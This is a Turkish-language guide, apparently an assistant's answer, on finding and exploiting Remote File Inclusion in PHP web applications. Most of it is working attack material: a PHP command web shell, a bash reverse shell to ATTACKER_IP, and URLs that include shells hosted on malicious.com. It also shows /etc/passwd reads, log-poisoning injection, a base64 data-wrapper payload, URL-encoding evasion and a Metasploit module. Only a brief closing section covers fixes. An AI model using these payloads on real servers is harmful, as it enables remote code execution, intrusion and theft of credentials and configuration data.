### RFI (Remote File Inclusion) Zafiyetini Tespit Etme ve İstismar Etme Rehberi

#### 1. **RFI Nedir?**
Remote File Inclusion, bir web uygulamasının kullanıcı tarafından sağlanan girdileri doğrulamadan dahil etmesiyle oluşan bir güvenlik açığıdır. Bu durum, saldırganın uzaktan barındırdığı bir dosyayı hedef sunucuda çalıştırmasına olanak tanır. Genellikle PHP tabanlı uygulamalarda görülür.

---

### **RFI Tespiti**

#### 1.1. **Zafiyetin Olabileceği Parametreleri Belirleme**
RFI zafiyetleri genellikle şu tür parametrelerde bulunur:
- `page`, `file`, `template`, `include`, `url` gibi adlandırmalar.
- Örnek:  
  ```php
  <?php include($_GET['page']); ?>
  ```

#### 1.2. **Parametrelerin Test Edilmesi**
Zafiyet olup olmadığını anlamak için şu payload'lar kullanılabilir:

- **Yerel Dosya Testi**  
  ```
  http://target.com/index.php?page=/etc/passwd
  http://target.com/index.php?page=../../../../etc/passwd
  ```

- **Uzaktan Dosya Testi**  
  ```
  http://target.com/index.php?page=http://malicious.com/shell.txt
  http://target.com/index.php?page=https://raw.githubusercontent.com/user/repo/master/shell.php
  ```

#### 1.3. **HTTP Yanıt Kodlarını ve Çıktısını Kontrol Etme**
- HTTP yanıtında aşağıdaki belirtilere dikkat edin:
  - Hedef dosyanın içeriği yükleniyorsa (örneğin `/etc/passwd` çıktısı).
  - PHP hata mesajları (`Warning: include()` veya `Warning: require()`).
  - Yanıt içeriğinde uzak dosyadan alınmış bir çıktı.

#### 1.4. **Manuel Test Araçları**
- **Burp Suite:** Proxy yardımıyla parametrelerin manipüle edilmesi.  
- **WFuzz:** Parametre fuzzing işlemi için.  
  ```
  wfuzz -c -z file,param-list.txt --hc 404 http://target.com/index.php?page=FUZZ
  ```

- **Dirbuster veya Gobuster:** Hedef URL üzerindeki dosya ve parametre dizinlerini keşfetmek için.

---

### **RFI İstismarı**

#### 2.1. **Basit Shell Yükleme**
RFI, uzaktaki bir dosyayı çalıştırdığı için kötü amaçlı bir PHP dosyasını hedefe yükleyebilirsiniz:

- **Payload Örneği:**
  ```php
  <?php system($_GET['cmd']); ?>
  ```
  - Barındırma: `http://malicious.com/shell.txt` üzerinde.

- **Kullanım:**
  ```
  http://target.com/index.php?page=http://malicious.com/shell.txt&cmd=id
  ```

#### 2.2. **Reverse Shell Kullanımı**
RFI üzerinden hedef sunucuda bir reverse shell açmak için:
- **Reverse Shell Scripti:**
  ```php
  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'"); ?>
  ```
- Hedef:
  ```
  http://target.com/index.php?page=http://malicious.com/revshell.php
  ```

#### 2.3. **Yerel Dosyaların Kötüye Kullanımı**
RFI zafiyeti, yalnızca yerel dosyaları içerebiliyorsa, aşağıdaki dosyalardan faydalanabilirsiniz:
- **/etc/passwd**: Kullanıcı bilgileri.
- **/var/www/html/config.php**: Web uygulaması yapılandırma dosyaları.
- **Log Dosyaları**: LFI ile erişilebilir dosyalardan faydalanarak bir web shell enjekte edilebilir.

#### 2.4. **Log Poisoning ile İstismar**
RFI yerine LFI var ancak uzaktan dosya dahil edilemiyorsa, log poisoning yapılabilir:
1. **Log Poisoning:**
   ```
   http://target.com/index.php?page=/var/log/apache2/access.log
   ```
   - Tarayıcı User-Agent veya Referer kısmına bir payload enjekte edin:
     ```
     <?php system($_GET['cmd']); ?>
     ```

---

### **Metod ve Trick'ler**

#### 3.1. **PHP Wrappers Kullanımı**
PHP'nin çeşitli wrapper'ları RFI veya LFI'yi istismar etmek için kullanılabilir:
- **Base64 ile Kullanım:**
  ```
  http://target.com/index.php?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
  ```
  (Base64 kodlanmış bir PHP scripti.)

- **Filter Wrapper:**
  ```
  http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
  ```

#### 3.2. **Firewall Atlatma**
- Eğer hedef sunucuda dış bağlantılar kısıtlanmışsa, DNS tabanlı veri sızdırma teknikleri kullanılabilir:
  - **Payload:**
    ```
    http://target.com/index.php?page=http://attacker.com/shell.txt
    ```
  - `attacker.com` DNS logları üzerinden veri toplanabilir.

#### 3.3. **Payload Gizleme**
- URL encode:
  ```
  http://target.com/index.php?page=http%3A%2F%2Fmalicious.com%2Fshell.txt
  ```

---

### **Kullanışlı Araçlar**

1. **Web Application Scanners**
   - OWASP ZAP
   - Burp Suite (Active Scan)
   - Nikto

2. **Exploit Frameworks**
   - Metasploit Framework
     ```
     use exploit/unix/webapp/php_include
     set RHOST target.com
     set TARGETURI /index.php?page=
     ```

3. **Manual Tools**
   - curl:
     ```
     curl "http://target.com/index.php?page=http://malicious.com/shell.txt"
     ```

   - wget:
     ```
     wget "http://target.com/index.php?page=http://malicious.com/shell.txt"
     ```

---

### **Zafiyetin Kapatılması**

#### 4.1. **Kod Güvenliği**
- Kullanıcı girdilerini doğrulayın ve temizleyin.
- Sabit bir dosya listesi kullanın:
  ```php
  $allowed_pages = array('home', 'about', 'contact');
  if (in_array($_GET['page'], $allowed_pages)) {
      include($_GET['page'] . '.php');
  } else {
      die("Unauthorized access!");
  }
  ```

#### 4.2. **Konfigürasyon Güvenliği**
- `allow_url_include` ve `allow_url_fopen` direktiflerini `php.ini` dosyasında devre dışı bırakın:
  ```
  allow_url_include = Off
  allow_url_fopen = Off
  ```

---

Bu rehber, RFI zafiyetlerini tespit etmek ve istismar etmek için teknik ve metodik bir bakış sağlar. Daha fazla detay için özel senaryolarınızı paylaşabilirsiniz. 😊
